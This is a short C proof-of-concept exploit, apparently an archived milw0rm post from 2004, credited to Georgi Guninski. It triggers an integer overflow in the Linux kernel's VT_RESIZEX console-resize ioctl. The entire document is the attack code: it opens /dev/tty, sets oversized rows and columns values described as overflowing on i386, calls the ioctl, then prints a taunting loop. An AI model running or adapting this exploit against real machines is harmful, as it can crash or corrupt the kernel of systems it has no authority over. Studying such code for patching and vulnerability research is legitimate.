/* vc_resize int overflow
 * Copyright Georgi Guninski
 * Cannot be used in vulnerability databases
 * */
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <linux/vt.h>
#include <sys/vt.h>
#include <sys/ioctl.h>
#include <string.h>
#include <unistd.h>

int main(int ac, char **av)
{
int fd;
struct vt_consize vv;
int cou=4242;

fd=open("/dev/tty",O_RDWR);
if (fd<0) {perror("open");return -42;}
memset(&vv,0,sizeof(vv));
vv.v_clin=0;
vv.v_vcol=0;
vv.v_ccol=0;

/* magic values, overflow on i386*/
vv.v_rows=65535;
vv.v_cols=32769;

system("sync");
if (ioctl(fd,VT_RESIZEX,&vv) < 0) {perror("ioctl");return -4242;}
while(cou--) printf(";)\n");
close(fd);
return 42;
}

// milw0rm.com [2004-12-16]